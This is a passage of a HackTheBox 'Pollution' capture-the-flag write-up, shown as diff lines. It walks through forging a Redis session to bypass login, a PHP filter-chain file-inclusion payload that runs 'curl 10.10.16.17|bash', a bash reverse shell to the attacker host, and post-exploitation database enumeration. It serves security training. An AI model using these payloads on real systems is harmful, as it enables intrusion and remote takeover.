+    &lt;script src=&quot;assets/js/tailwind.js&quot;&gt;&lt;/script&gt;
+    &lt;title&gt;Developers Collect&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;div class=&quot;flex flex-col h-screen justify-between&quot;&gt;
+        &lt;?php include(&quot;header.php&quot;); ?&gt;
+        
+        &lt;main class=&quot;mb-auto mx-24&quot;&gt;
+            &lt;?php include($_GET[&#x27;page&#x27;] . &quot;.php&quot;); ?&gt;
+        &lt;/main&gt;
+
+        &lt;?php include(&quot;footer.php&quot;); ?&gt;
+    &lt;/div&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;</code></pre>
+        <p id="0884342a-0f2c-4dbb-b574-b619f82421d2">
+          I tried to read 
+          
+            
+              /var/www/developers/login.php
+            
+          
+           but nothing was returned. We can see the file 
+          
+            
+              bootstrap.php
+            
+          
+           being included in the first line. Let’s see what’s in it : 
+        </p>
+        
+        
+        
+<pre id="35ad2c98-0ae4-4901-9e9e-d093b3c85b25" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ echo &#x27;PD9waHAKCmluaV9zZXQoJ3Nlc3Npb24uc2F2ZV9oYW5kbGVyJywgJ3JlZGlzJyk7CmluaV9zZXQoJ3Nlc3Npb24uc2F2ZV9wYXRoJywgJ3RjcDovL2xvY2FsaG9zdDo2Mzc5Lz9hdXRoPU[HIDDEN]&#x27; | base64 -d
+&lt;?php
+
+ini_set(&#x27;session.save_handler&#x27;, &#x27;redis&#x27;);
+ini_set(&#x27;session.save_path&#x27;, &#x27;tcp://localhost:6379/?auth=[HIDDEN]&#x27;);
+
+session_start();</code></pre>
+        <p id="713de02a-ab0a-4bc8-828c-a8dbf439b825">
+          We have the password for 
+          
+            <a href="https://redis.io/">
+              Redis
+            </a>
+          
+          . Now, let’s try to connect to it again, but this time, with the password we just found : 
+        </p>
+        
+        
+        
+<pre id="7c4bd1a9-0872-4bbb-a6e1-a1b1a31381a3" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ redis-cli -h 10.129.228.126
+10.129.228.126:6379&gt; AUTH [HIDDEN]
+OK
+10.129.228.126:6379&gt; info
+# Server
+redis_version:6.0.16
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:6d95e1af3a2c082a
+redis_mode:standalone
+os:Linux 5.10.0-19-amd64 x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:10.2.1
+process_id:966
+run_id:f56068649205271aed287d76999875a512befd6f
+tcp_port:6379
+uptime_in_seconds:19312
+uptime_in_days:0
+hz:10
+configured_hz:10
+lru_clock:6897609
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+io_threads_active:0
+
+# Clients
+connected_clients:1
+client_recent_max_input_buffer:8
+client_recent_max_output_buffer:0
+blocked_clients:0
+tracking_clients:0
+clients_in_timeout_table:0
+
+# Memory
+used_memory:873704
+used_memory_human:853.23K
+used_memory_rss:44236800
+used_memory_rss_human:42.19M
+used_memory_peak:41455208
+used_memory_peak_human:39.53M
+used_memory_peak_perc:2.11%
+used_memory_overhead:830520
+used_memory_startup:809824
+used_memory_dataset:43184
+used_memory_dataset_perc:67.60%
+allocator_allocated:1186432
+allocator_active:1601536
+allocator_resident:5070848
+total_system_memory:4087750656
+total_system_memory_human:3.81G
+used_memory_lua:41984
+used_memory_lua_human:41.00K
+used_memory_scripts:0
+used_memory_scripts_human:0B
+number_of_cached_scripts:0
+maxmemory:0
+maxmemory_human:0B
+maxmemory_policy:noeviction
+allocator_frag_ratio:1.35
+allocator_frag_bytes:415104
+allocator_rss_ratio:3.17
+allocator_rss_bytes:3469312
+rss_overhead_ratio:8.72
+rss_overhead_bytes:39165952
+mem_fragmentation_ratio:53.22
+mem_fragmentation_bytes:43405608
+mem_not_counted_for_evict:0
+mem_replication_backlog:0
+mem_clients_slaves:0
+mem_clients_normal:20504
+mem_aof_buffer:0
+mem_allocator:jemalloc-5.2.1
+active_defrag_running:0
+lazyfree_pending_objects:0
+
+# Persistence
+loading:0
+rdb_changes_since_last_save:1
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1684618965
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:0
+rdb_current_bgsave_time_sec:-1
+rdb_last_cow_size:356352
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok
+aof_last_cow_size:0
+module_fork_in_progress:0
+module_fork_last_cow_size:0
+
+# Stats
+total_connections_received:571280
+total_commands_processed:1713823
+instantaneous_ops_per_sec:0
+total_net_input_bytes:103400190
+total_net_output_bytes:8574939
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:571098
+expired_stale_perc:0.00
+expired_time_cap_reached_count:0
+expire_cycle_cpu_milliseconds:3436
+evicted_keys:0
+keyspace_hits:174
+keyspace_misses:571100
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:1593
+migrate_cached_sockets:0
+slave_expires_tracked_keys:0
+active_defrag_hits:0
+active_defrag_misses:0
+active_defrag_key_hits:0
+active_defrag_key_misses:0
+tracking_total_keys:0
+tracking_total_items:0
+tracking_total_prefixes:0
+unexpected_error_replies:0
+total_reads_processed:2285112
+total_writes_processed:1713831
+io_threaded_reads_processed:0
+io_threaded_writes_processed:0
+
+# Replication
+role:master
+connected_slaves:0
+master_replid:227d542acf6607e6f7c0bcc9f9d4853085865dc2
+master_replid2:0000000000000000000000000000000000000000
+master_repl_offset:0
+second_repl_offset:-1
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+
+# CPU
+used_cpu_sys:126.901990
+used_cpu_user:60.478516
+used_cpu_sys_children:1.511871
+used_cpu_user_children:11.125892
+
+# Modules
+
+# Cluster
+cluster_enabled:0
+
+# Keyspace
+db0:keys=2,expires=2,avg_ttl=1161533
+10.129.228.126:6379&gt;</code></pre>
+        <p id="04626fca-1713-4610-9115-bf5ca711a8d5">
+          Now, we have access to 
+          
+            <a href="https://redis.io/">
+              Redis
+            </a>
+          
+          . We can list the keys like so : 
+        </p>
+        
+        
+        
+<pre id="51f651e6-9202-4a14-96d7-4d827b4168a6" class="code"><code>10.129.228.126:6379&gt; keys *
+1) &quot;PHPREDIS_SESSION:n3bun5mu43k2uq2debh4dv3atd&quot;
+2) &quot;PHPREDIS_SESSION:bd807jkqtg4eg0ae57jmor56qm&quot;</code></pre>
+        <p id="0fa7244a-34ed-4358-8cc2-160b66079478">
+          There seems to be keys for each 
+          
+            
+              PHPSESSID
+            
+          
+           on 
+          
+            
+              <a href="http://developers.collect.htb/">
+                http://developers.collect.htb/
+              </a>
+            
+          
+          . Let’s verify this by looking at our 
+          
+            
+              PHPSESSID
+            
+          
+           cookie on our web browser :
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%2016.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%2016.png"/>
+          </a>
+        
+        <p id="eb0334d8-aa0b-44c5-85d3-64d98bc434bf">
+          So now, we are sure about this. Let’s see what data is stored in our key : 
+        </p>
+        
+        
+        
+<pre id="44674863-8a1b-4ab2-a65e-fd5d26af8706" class="code"><code>10.129.228.126:6379&gt; get &quot;PHPREDIS_SESSION:n3bun5mu43k2uq2debh4dv3atd&quot;
+&quot;&quot;</code></pre>
+        <p id="e5f7faed-18b6-41a5-b3ad-360c3634fe26">
+          It is empty… Let’s see the other key :
+        </p>
+        
+        
+        
+<pre id="d15788b5-959b-4e29-902f-2df16d2a68c0" class="code"><code>10.129.228.126:6379&gt; get PHPREDIS_SESSION:bd807jkqtg4eg0ae57jmor56qm
+&quot;username|s:4:\&quot;test\&quot;;role|s:5:\&quot;admin\&quot;;&quot;</code></pre>
+        <p id="2172b61b-b135-4062-b3d3-42a7dec11268">
+          We can take example on this one and add the data 
+          
+            
+              auth
+            
+          
+           set to 
+          
+            
+              True
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="12f39751-5616-4cb0-a002-d41b6cf9ec95" class="code"><code>10.129.228.126:6379&gt; set PHPREDIS_SESSION:n3bun5mu43k2uq2debh4dv3atd &quot;username|s:4:\&quot;test\&quot;;role|s:5:\&quot;admin\&quot;;auth|s:4:\&quot;True\&quot;;&quot;
+OK</code></pre>
+        <p id="d944e767-c99e-43e1-82cc-04ad765b144c">
+          Now let’s refresh the page : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%2017.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Hard/Pollution/Untitled%2017.png"/>
+          </a>
+        
+        <p id="3abef9f1-0af5-4827-afff-cd1b3e67351b">
+          We successfully bypassed the login page. 
+        </p>
+        <h2 id="70887782-19c2-437f-897f-b6dc01f77463">
+          
+            LFI2RCE
+          
+        </h2>
+        <p id="05eb92db-7ddd-4c9b-9612-90fbf3bef55c">
+          We can see in the url a 
+          
+            
+              page
+            
+          
+           parameter that defines the page to be included. Maybe we can get a 
+          
+            
+              LFI (Local File Inclusion)
+            
+          
+           from this ? 
+        </p>
+        <p id="4f036ec4-c824-4a41-9e84-56e74d477d2f">
+          I tried different 
+          
+            
+              LFI
+            
+          
+           techniques but none of them worked. We can try to exploit a 
+          
+            
+              LFI2RCE (Local File Inclusion to Remote Code Execution)
+            
+          
+           technique using 
+          
+            
+              PHP filters
+            
+          
+          . There is a python script that can generate the payload for us at 
+          
+            
+              <a href="https://github.com/synacktiv/php_filter_chain_generator">
+                https://github.com/synacktiv/php_filter_chain_generator
+              </a>
+            
+          
+          . Let’s download this script and use it to generate our payload (try to use the smallest payload you can to avoid the url being too long) : 
+        </p>
+        
+        
+        
+<pre id="20a4ea86-26d6-43d2-9916-a818933fe37c" class="code"><code>┌──(kali㉿kali)-[~/…/Hard/Pollution/exploits/php_filter_chain_generator]
+└─$ python3 php_filter_chain_generator.py --chain &#x27;&lt;?=`curl 10.10.16.17|bash`;;?&gt;&#x27;
+[+] The following gadget chain will generate the following code : &lt;?=`curl 10.10.16.17|bash`;;?&gt; (base64 value: PD89YGN1cmwgMTAuMTAuMTYuMTd8YmFzaGA7Oz8+)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</code></pre>
+        <p id="c48c769f-5ca6-4b7a-9bee-387decc9909a">
+          This payload will make the server execute the following command : “
+          
+            
+              curl 10.10.16.17|bash
+            
+          
+          ”. To make it simple, it will get the 
+          
+            
+              index.html
+            
+          
+           page on our webserver and execute it with bash. We simply need to create an 
+          
+            
+              index.html
+            
+          
+           file that contains a bash reverse shell and start a python web server in the same directory : 
+        </p>
+        
+        
+        
+<pre id="3e727252-cdbc-464b-8d38-5ecdb51a8984" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ cat index.html 
+#!/bin/bash
+
+/bin/sh -i &gt;&amp; /dev/tcp/10.10.16.17/4242 0&gt;&amp;1
+                                                              
+┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
+        <p id="5956bbb8-b06c-4303-84c9-15977efbfd8b">
+          We also need to start a listener on port 4242 to get the reverse shell : 
+        </p>
+        
+        
+        
+<pre id="5ee8576c-83fb-4253-a8bc-933216ed3ad9" class="code"><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ pwncat -l 4242</code></pre>
+        <p id="d4185857-e02c-4d30-ad78-18f2af0e3a30">
+          Now, we can put our filter chain payload in the 
+          
+            
+              page
+            
+          
+           parameter and press enter. After this, we can take a look at our webserver : 
+        </p>
+        
+        
+        
+<pre id="dcbf1f68-9954-4f08-b2f8-41b102eee7f0" class="code"><code>┌──(kali㉿kali)-[~/…/CTF/Hard/Pollution/exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.228.126 - - [20/May/2023 19:05:23] &quot;GET / HTTP/1.1&quot; 200 -</code></pre>
+        <p id="ea871ce7-281e-4841-8c79-dce4a6fe0aae">
+          The server successfully executed our payload. Now, let’s take a look at our listener : 
+        </p>
+        
+        
+        
+<pre id="9c2ad400-f06e-4e56-923f-5aa8d0783f12" class="code"><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ pwncat -l 4242
+/bin/sh: 0: can&#x27;t access tty; job control turned off
+$ whoami
+www-data</code></pre>
+        <p id="4a9c7992-eaae-4193-9c63-a426b5b5e50a">
+          Now we have a foothold as 
+          
+            
+              www-data
+            
+          
+           on the system.
+        </p>
+        <h1 id="085e8847-d835-4ab1-b227-0ed5b13c5569">
+          Post-exploitation
+        </h1>
+        <h2 id="824d87e2-2b83-4acc-9ec4-ab23597c2ba7">
+          
+            Local enumeration
+          
+        </h2>
+        <p id="34085941-af3d-4486-989e-9c42bb4b6625">
+          Looking in 
+          
+            
+              /var/www/collect/
+            
+          
+          , we can find a file called 
+          
+            
+              config.php
+            
+          
+          . Let’s see what’s in it : 
+        </p>
+        
+        
+        
+<pre id="54090bc4-0f3e-48c1-90d7-da20c17a9561" class="code"><code>&lt;?php
+
+
+return [
+    &quot;db&quot; =&gt; [
+        &quot;host&quot; =&gt; &quot;localhost&quot;,
+        &quot;dbname&quot; =&gt; &quot;webapp&quot;,
+        &quot;username&quot; =&gt; &quot;webapp_user&quot;,
+        &quot;password&quot; =&gt; [HIDDEN],
+        &quot;charset&quot; =&gt; &quot;utf8&quot;
+    ],
+];</code></pre>
+        <p id="7b12fac0-e3ec-4c4a-94b3-b0c3e3f9ce7e">
+          We have the credentials for 
+          
+            <a href="https://www.mysql.com/">
+              MySQL
+            </a>
+          
+          . Let’s connect to 
+          
+            <a href="https://www.mysql.com/">
+              MySQL
+            </a>
+          
+           and see if we can find some useful informations : 
+        </p>
+        
+        
+        
+<pre id="451abc2d-4ca8-4d04-824e-e4bee638acd4" class="code"><code>www-data@pollution:~$ mysql -u webapp_user -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 491
+Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.
+
+MariaDB [(none)]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| developers         |
+| forum              |
+| information_schema |
+| mysql              |
+| performance_schema |
+| pollution_api      |
+| webapp             |
++--------------------+
+7 rows in set (0.001 sec)</code></pre>
+        <p id="a787a686-b2e6-42d1-acd7-19b3b948c04b">
+          Let’s take a look at the 
+          
+            
+              pollution_api
+            
+          
+           database : 
+        </p>
+        
+        
+        
+<pre id="4dc56c66-2108-42b8-918b-74546a8d4188" class="code"><code>MariaDB [(none)]&gt; use pollution_api
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [pollution_api]&gt; show tables;
++-------------------------+
+| Tables_in_pollution_api |
++-------------------------+
+| messages                |
+| users                   |
++-------------------------+
+2 rows in set (0.000 sec)</code></pre>
+        <p id="16326f1b-f414-4977-b141-b44761abf28b">
+          Let’s see what is in 
+          
+            
+              users
+            
+          
+           table : 
+        </p>
+        
+        
+        
+<pre id="9fee8c12-14ae-4083-b3a7-031e4a72f4c6" class="code"><code>MariaDB [pollution_api]&gt; select * from users;
++----+----------+----------+------+---------------------+---------------------+
+| id | username | password | role | createdAt           | updatedAt           |
++----+----------+----------+------+---------------------+---------------------+
+|  1 | test     | test     | user | 2023-05-20 18:09:54 | 2023-05-20 18:09:54 |
+|  2 | test2    | test     | user | 2023-05-20 18:27:34 | 2023-05-20 18:27:34 |
++----+----------+----------+------+---------------------+---------------------+</code></pre>
+        <p id="eddf123b-8acd-4e5e-b43d-9bbb93d3cc6a">
+          This is where the 
+          
+            
+              Pollution API
+            
+          
+           users we created from the admin panel are stored. For now, there is nothing more useful to find on 
+          
+            <a href="https://www.mysql.com/fr/">
+              MySQL
+            </a>
+          
+          . Let’s move on and enumerate more.
+        </p>
+        <p id="522dce77-1495-4407-8903-7f6a9dcaa45b">
+          Remember, in the proxy history we found earlier, a request was made to 
+          
+            
+              <a href="http://127.0.0.1:3000/">
+                http://127.0.0.1:3000/
+              </a>
+            
+          
+          
+             
+          
+          which seems to be the 
+          
+            
+              Pollution API
+            
+          
+          . Let’s make a simple 
+          
+            
+              GET
+            
+          
+           request with 
+          
+            <a href="https://curl.se/">
+              curl
+            </a>
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="a33452cb-6a78-47d3-9e4f-d4d162b4f3b2" class="code"><code>www-data@pollution:~/collect$ curl localhost:3000
+{&quot;Status&quot;:&quot;Ok&quot;,&quot;Message&quot;:&quot;Read documentation from api in /documentation&quot;}</code></pre>
+        <p id="c8b61044-94f8-4986-8ad9-f1d2a649fe80">
+          So now, we are sure this is how to access the 
+          
+            
+              Pollution API
+            
+          
+          . Let’s see the documentation : 
+        </p>
+        
+        
+        
+<pre id="efeac2ce-ba48-477f-b3fa-e235e34c5ceb" class="code"><code>www-data@pollution:~/collect$ curl localhost:3000/documentation
+{&quot;Documentation&quot;:{&quot;Routes&quot;:{&quot;/&quot;:{&quot;Methods&quot;:&quot;GET&quot;,&quot;Params&quot;:null},&quot;/auth/register&quot;:{&quot;Methods&quot;:&quot;POST&quot;,&quot;Params&quot;:{&quot;username&quot;:&quot;username&quot;,&quot;password&quot;:&quot;password&quot;}},&quot;/auth/login&quot;:{&quot;Methods&quot;:&quot;POST&quot;,&quot;Params&quot;:{&quot;username&quot;:&quot;username&quot;,&quot;password&quot;:&quot;password&quot;}},&quot;/client&quot;:{&quot;Methods&quot;:&quot;GET&quot;,&quot;Params&quot;:null},&quot;/admin/messages&quot;:{&quot;Methods&quot;:&quot;POST&quot;,&quot;Params&quot;:{&quot;id&quot;:&quot;messageid&quot;}},&quot;/admin/messages/send&quot;:{&quot;Methods&quot;:&quot;POST&quot;,&quot;Params&quot;:{&quot;text&quot;:&quot;message text&quot;}}}}}</code></pre>
+        <p id="60625a19-4088-4db4-87b0-2d082c8d35a5">
+          Let’s try to send a request to 
+          
+            
+              /admin/messages/send
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="8bc8b84f-cedc-43be-9515-9a0e1943da4b" class="code"><code>www-data@pollution:~$ curl localhost:3000/admin/messages/send
+{&quot;Status&quot;:&quot;Error&quot;,&quot;Message&quot;:&quot;You are not allowed&quot;}</code></pre>
+        <p id="97ed6dac-ac12-458c-b2ed-7c9d95110727">
+          We are not allowed to access this endpoint. Let’s take a look back at the request that 
+          
+            
+              victor
+            
+          
+           sent to the 
+          
+            
+              Pollution API
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="9a261b02-330e-4b3a-b0b3-1569e5ab854f" class="code"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Pollution]
+└─$ echo &#x27;UE9TVCAvYXV0aC9sb2dpbiBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjE6MzAwMApVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDYuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDYuMApBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgKQWNjZXB0LUxhbmd1YWdlOiBwdC1CUixwdDtxPTAuOCxlbi1VUztxPTAuNSxlbjtxPTAuMwpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUKQ29ubmVjdGlvbjogY2xvc2UKVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQpJZi1Ob25lLU1hdGNoOiBXLyIzMi1VL2RzYUs2bVRRWHJYN0RsWHhDaDVMOFlMRjgiCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbnRlbnQtTGVuZ3RoOiAzNwoKeyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3MifQ==&#x27; | base64 -d
+POST /auth/login HTTP/1.1
+Host: 127.0.0.1:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+If-None-Match: W/&quot;32-U/dsaK6mTQXrX7DlXxCh5L8YLF8&quot;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+
+{&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;pass&quot;}</code></pre>
+        <p id="079c0b87-ef97-460b-bded-73e60dc3a0bc">
+          We need to login first. Let’s try to login to the 
+          
+            
+              Pollution API
+            
+          
+           using the credentials we created on 
+          
+            
+              <a href="http://collect.htb/admin">
+                http://collect.htb/admin
+              </a>
+            
+          
+           earlier : 
+        </p>
+        
+        
+        
+<pre id="d8112d7c-2fd7-48a6-8af2-2ed49a3dc692" class="code"><code>www-data@pollution:~$ curl -X POST localhost:3000/auth/login -d &#x27;{&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;}&#x27;
+{&quot;Status&quot;:&quot;Parameters not found&quot;}</code></pre>
+        <p id="a50b43c8-667e-4058-bc6f-a056094f230d">
+          Parameters not found… Let’s take a look at the forum thread where we found the proxy history : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Pollution%20(Hard)%20fcda034d930245db84f4df477ce65ca0/Untitled%2018.png">
